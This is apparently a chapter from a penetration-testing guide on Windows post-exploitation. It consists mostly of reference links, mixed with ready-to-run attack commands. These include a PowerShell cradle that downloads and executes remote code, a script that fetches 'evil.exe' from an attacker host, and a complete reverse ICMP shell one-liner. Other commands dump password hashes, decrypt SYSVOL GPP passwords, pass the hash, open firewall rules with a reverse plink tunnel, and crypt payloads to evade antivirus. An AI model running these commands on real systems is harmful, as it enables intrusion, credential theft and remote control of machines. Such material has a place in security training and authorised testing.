# Chapter 4 - Windows Post-Exploitation

> _Practice the principle of least privilege. Do not log into a computer with administrator rights unless you must do so to perform specific tasks. Running your computer as an administrator \(or as a Power User in Windows\) leaves your computer vulnerable to security risks and exploits. Simply visiting an unfamiliar Internet site with these high-privilege accounts can cause extreme damage to your computer, such as reformatting your hard drive, deleting all your files, and creating a new user account with administrative access.” _
>
> _**— Indiana University \(Best practices for computer security\)**_

This is the phase I like to refer to as second pass enumeration or enumeration from the inside. Now that we've gained a foothold into the network it is crucial to run all of our enumeration from the ground up as an inside actor.

##### Resources

[Windows Privilege Escalation Fundamentals - FuzzySecurity](http://www.fuzzysecurity.com/tutorials/16.html)

[Windows PrivEsc Check - GitHub](https://github.com/pentestmonkey/windows-privesc-check)

[Windows Exploit Suggester - GitHub](https://github.com/GDSSecurity/Windows-Exploit-Suggester)

[Encyclopaedia Of Windows Privilege Escalation - YouTube](https://www.youtube.com/watch?v=kMG8IsCohHA)

[Level Up! Practical Windows Privilege Escalation - YouTube](https://www.youtube.com/watch?v=PC_iMqiuIRQ)

[Windows Privilege Escalation methods for PenTesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)

[Windows Attacks At is the new Black - YouTube](https://www.youtube.com/watch?v=_8xJaaQlpBo)

[Well, that escalated quickly](https://toshellandback.com/2015/11/24/ms-priv-esc/)

[Analyizing local privilege escalations in win2k](http://uninformed.org/?v=all&a=45&t=txt)

[The System Challenge - Decoder's Blog](https://decoder.cloud/2017/02/21/the-system-challenge/)

[The Wallstreet of Windows Binaries](https://www.youtube.com/watch?v=8zlTv7fRjV8)

[Windows Operating System Archaeology](https://github.com/subTee/windows-operating-system-archaeology)

[Breaking .NET Through Serialization](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)

[Windows Kernel Exploits - GitHub](https://github.com/SecWiki/windows-kernel-exploits)

##### Cross Compiling from Kali

```
Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c
```

##### Transpile Python into EXE

```
Kali> python pyinstaller.py --onefile file.py
```

##### Uploading Files

```
Kali> cp /usr/share/windows-binaries/nc.exe
Kali> upx -9 nc.exe
Kali> wine exe2bat.exe nc.exe nc.txt
```

##### Security Stuff

[Exploitation Techniques and Mitigations on Windows](http://www.hick.org/~mmiller/presentations/misc/exploitation_techniques_and_mitigations_on_windows.pdf)

[Windows Exploitation](https://exploit.courses/files/bfh2017/day6/0x60_WindowsExploiting.pdf)

[Authentication Registry Keys - MSDN](https://msdn.microsoft.com/en-us/library/windows/desktop/aa374737%28v=vs.85%29.aspx)

[Demystifying AppContainers in Windows 8 Part 1](https://blog.nextxpert.com/2013/01/31/demystifying-appcontainers-in-windows-8-part-i/)

[Protected Processes in Windows](https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&seqNum=2)

[LSA Authentication - MSDN](https://msdn.microsoft.com/en-us/library/windows/desktop/aa378326%28v=vs.85%29.aspx)

[Intercepting System Calls on x86\_64 Windows](http://jbremer.org/intercepting-system-calls-on-x86_64-windows/)

[Introduction to Windows Kernel Security](http://blog.cmpxchg8b.com/2013/05/introduction-to-windows-kernel-security.html)

[Windows 8 ASLR Internals](http://blog.ptsecurity.com/2012/12/windows-8-aslr-internals.html)

[Windows Program Automatic Startup Locations](https://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/)

[Demystifying the Windows Firewall](https://channel9.msdn.com/Events/Ignite/New-Zealand-2016/M377)

[Privilege Escalation on Windows 7,8,10, Server 2008, Server 2012 … and a new network attack](https://foxglovesecurity.com/2016/01/16/hot-potato/)

[Bypassing Firewalls with Port 23](http://hkashfi.blogspot.com/2008/04/bypassing-firewalls-with-port_23.html)

[Pass the hash is dead long live LocalAccountTokenFilterPolicy](https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)

[NetView](https://github.com/mubix/netview)

[Getting Windows to play with itself: A PenTester's guide to Windows API abuse](http://www.irongeek.com/i.php?page=videos/derbycon4/t122-getting-windows-to-play-with-itself-a-pen-testers-guide-to-windows-api-abuse-brady-bloxham)

##### AZURE

[Compromise as a Service: our pleAZURE](https://www.youtube.com/watch?v=gxWqwX7LfbU)

##### Powershell Foo

> **Resources**

[Attacking ADFS Endpoints with PowerShell](http://www.irongeek.com/i.php?page=videos/derbycon6/118-attacking-adfs-endpoints-with-powershell-karl-fosaaen)

[PowerShell AD Recon](https://github.com/PyroTek3/PowerShell-AD-Recon)

[PowerShell Secrets and Tactics](https://www.youtube.com/watch?v=mPPv6_adTyg)

[An Intro to PowerShell and how to use it for Evil](https://www.youtube.com/watch?v=YSUJNInriiY)

[Offensive Active Directory with PowerShell](https://www.youtube.com/watch?v=cXWtu-qalSs)

[Low-Level Windows API Access From PowerShell - FuzzySecurity](http://www.fuzzysecurity.com/tutorials/24.html)

[PowerShell Unicorn](https://github.com/trustedsec/unicorn)

[Sherlock for Powershell](https://github.com/rasta-mouse/Sherlock)

> ###### Upgrade Shell

```
C:\> powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.1/file.txt')"
```

> ###### wget

```
echo $storageDir = $pwd > wget.ps1   
echo $webclient = New-Object System.Net.WebClient >> wget.ps1   
echo $url = "http://$ATTACKER/evil.exe" >> wget.ps1
echo $file = "new-exploit.exe" >> wget.ps1    
echo $webclient.DownloadFile($url,$file) >> wget.ps1

C:\> powershell.exe -ExecutionPolicy Bypass ‐NoLogo  ‐NonInteractive  ‐NoProfile ‐File wget.ps1
```

> ###### Execute ps1

```
C:\> powershell -exec bypass -windowstyle hidden -nop -file c:\path\to\file.ps1
```

> ###### Stream contents of file

```
C:\> Get-Item /path/to/file.zip -Stream *
```

> ###### Get permissions of directory/file

```
C:\> Get-ACL C:\path\to\file\or\directory
```

> ###### Packet testing

```
# TCP
# Setup TCP Listener ie: netcat
C:\> powershell -Command '$client = New-Object System.Net.Sockets.TcpClient;$client.Connect( "10.10.14.42", 8000 );[Byte[]] $packet = [Text.Encoding]::ASCII.GetBytes("pie")$client.Send($packet, $packet.Length);$client.Close();'

# UDP
# Setup UDP Listener ie: socat
C:\> powershell -Command '$client = New-Object System.Net.Sockets.UdpClient;$client.Connect( "10.10.14.42", 8000 );[Byte[]] $packet = [Text.Encoding]::ASCII.GetBytes("pie");$client.Send($packet, $packet.Length);$client.Close();'

# ICMP
Kali> sudo python icmpsh_m.py $ATTACKER $TARGET
C:\> powershell -Command '$client = New-Object System.Net.NetworkInformation.Ping;$options = New-Object System.Net.NetworkInformation.PingOptions;$options.DontFragment = $True;$packet = [Text.Encoding]::ASCII.GetBytes("pie");$client.Send("10.10.14.42", 500, $packet, $options);'
```

> ###### Reverse ICMP shell

```
Kali> sudo bash -c "echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all"
Kali> sudo python icmpsh_m.py $ATTACKER $TARGET

C:\> powershell -nop -Command "$IP = '10.10.14.42';$client = New-Object System.Net.NetworkInformation.Ping;$options = New-Object System.Net.NetworkInformation.PingOptions;$options.DontFragment = $true;$client.send($IP, 1000, ([Text.Encoding]::ASCII).GetBytes('pie'), $options);while($true){$comms = $client.Send($IP, 1000, ([Text.Encoding]::ASCII).GetBytes(''), $options);if($comms.Buffer){ $cmd = ([Text.Encoding]::ASCII).GetString($comms.Buffer);$reply = (Invoke-Expression -Command $cmd | Out-String);$client.send($IP, 1000, ([Text.Encoding]::ASCII).GetBytes($reply), $options);}}"
```

##### Services

[Windows Privilege Escalation via weak Service Permissions](http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/)

[The Art of Becoming TrustedInstaller](https://tyranidslair.blogspot.com/2017/08/the-art-of-becoming-trustedinstaller.html)

##### LDAP

[5 Ways to find Systems running domain admin processes](https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/)

[I hunt SysAdmins part 1](http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/)

[I hunt SysAdmins part 2](https://www.slideshare.net/harmj0y/i-hunt-sys-admins-20)

[PenTesting Active Directory Environments: CrapMapExec](https://n0where.net/pentesting-active-directory/)

[Active Directory Privilege Relationships: BloodHound](https://n0where.net/active-directory-privilege-relationships-bloodhound/)

[Active Directory Architecture - MSDN](https://msdn.microsoft.com/en-us/library/bb727030.aspx)

[A Week of Evading Microsoft ATA Day 1](http://www.labofapenetrationtester.com/2017/08/week-of-evading-microsoft-ata-day1.html)

[Dumping a domains worth of passwords with mimikatz part 2](http://www.harmj0y.net/blog/powershell/dumping-a-domains-worth-of-passwords-with-mimikatz-pt-2/)

[Attack Methods for gaining Domain Admin](https://hackingandsecurity.blogspot.com/2017/07/attack-methods-for-gaining-domain-admin.html?view=timeslide)

[Find AD users with empty passwords](https://4sysops.com/archives/find-ad-users-with-empty-password-passwd_notreqd-flag-using-powershell/)

[Domain Trusts and why you should care](http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/)

[A PenTester's guide to group scoping](http://www.harmj0y.net/blog/activedirectory/a-pentesters-guide-to-group-scoping/)

[How to own any Windows network with group policy hijacking attacks](https://labs.mwrinfosecurity.com/blog/how-to-own-any-windows-network-with-group-policy-hijacking-attacks/)

##### Kerberos

[The Secret Life of Krbtgt](https://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf)

[Kerberos Golden Ticket Protection](https://cert.europa.eu/static/WhitePapers/UPDATED - CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf)

[Kerberos Golden Ticket Final](http://cybersecology.com/wp-content/uploads/2016/05/Golden_Ticket-v1.13-Final.pdf)

[Et Tu Kerberos](https://www.youtube.com/watch?v=RIRQQCM4wz8)

[Abusing Microsoft Kerberos](https://www.youtube.com/watch?v=lJQn06QLwEw)

[How to pass the ticket through SSH tunnels](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)

[From Pass the Hash to Pass the Ticket with no pain](http://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/)

[Abusing Token Privileges for LPE](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)

##### Dump Hashes

[Dump windows password hashes efficiently part 1](http://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html)

[I'll get your credentials... Later! - FuzzySecurity](http://www.fuzzysecurity.com/tutorials/18.html)

[Grab the Windows Secrets! - Decoder's Blog](https://decoder.cloud/2017/02/11/grab-the-windows-secrets/)

```
C:\> fgdump.exe
C:\> type 127.0.0.1.pwdump
```

##### WCE

```
C:\> wce -w
```

##### PSExec

You need to be an admin already it copies an executable to an admin share and registers a service and starts it

[SysInternals PSExec - TechNet](https://technet.microsoft.com/en-us/sysinternals/psexec.aspx)

[PUPY](https://github.com/n1nj4sec/pupy)

[WinEXE](https://sourceforge.net/projects/winexe/)

[PSExec Pass the Hash](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec_psh)

[Lateral Movement with Invoke-PsExec](http://www.powershellempire.com/?page_id=523)

##### UAC

[UACME](https://github.com/hfiref0x/UACME)

[Anatomy of UAC Attacks - FuzzySecurity](http://www.fuzzysecurity.com/tutorials/27.html)

##### WMIC

[WMIExec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py)

##### Insecure File Permissions

[Elevating privileges by exploiting weak folder permissions](https://www.greyhathacker.net/?p=738)

```
C:\> icacls example.exe
```

##### Insecure SYSVOL

```
C:\> net use z: \\dc01\SYSVOL
Z:\> dir /s Groups.xml
Z:\> copy
Kali> gpp-decrypt
```

##### RDP

[RDP Hijacking: How to hijack RDS and RemoteApp sessions transparently to move through an organization](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)

##### DLL Injection

[Windows DLL Injection Basics](http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html)

[Portable Execution Injection](http://www.malwaretech.com/2013/11/portable-executable-injection-for.html)

[Automated DLL Enumeration](https://github.com/sensepost/rattler)

[Automated DLL Injection](https://github.com/fdiskyou/injectAllTheThings/)

##### NTLM/v2

[Practical guide to NTLM Relaying in 2017 AKA Getting a foothold in under 5 minutes](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

[SMB Relay demystified and NTLMv2 Pwnage with Python](https://pen-testing.sans.org/blog/pen-testing/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python)

##### Token Stealing

Once you have admin access on a computer, you can use the tokens of the other users to access resources in the domain.

##### Passing the Hash

```
Kali> export SMBHASH="HASH"
Kali> pth-winexe -U administrator //$TARGET cmd
```

[Pass the Hash toolkit](https://github.com/byt3bl33d3r/pth-toolkit)

##### runas

[Invoke-Runas](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps)

[Runas Reference](https://ss64.com/nt/runas.html)

##### Encapsulating SSH Traffic with httptunnel

```
# Bypass Notify with administrative account
$secpasswd = ConvertTo-SecureString "password" -AsPlainText -Force
$mycreds = New-Object System.Management.Automtion.PSCredential("Administrator", $secpasswd)
$computer = "DEV01"
powershell -ExecutionPolicy Bypass -File c:\Windows\temp\run.ps1

# add ruleset for firewall
C:\> netsh advfirewall firewall add rule name ="httptunnel_client" dir=in action=allow program="httptunnel_client.exe enable=yes
C:\> netsh advfirewall firewall add rule name ="3000" dir=in action=allow protocol=TCP localport=3000
C:\> netsh advfirewall firewall add rule name="1080 dir=in action=allow protocol=TCP localport=1080
C:\> netsh advfirewall firewall add rule name="1079" dir=in action=allow protocol=TCP localport=1079
C:\> httptunnel_client.exe

# upload /usr/share/windows-binaries/plink.exe then setup port forward
C:\> plink -l root -pw pass -R 3389:127.0.0.1:3389 208.68.234.99 -P 3000

# Bypass Anti-virus
Kali> cp payload.exe newpayload.exe
Kali> cp /usr/share/windows-binaries/Hyperion-1.0.zip .
Kali> i586-mingw32msvc-g++ Src/Crypter/*.cpp -o hyperion.exe
Kali> wine hyperion.exe ../newpayload.exe ../crypted.exe
```

[SigThief](https://github.com/secretsquirrel/SigThief)

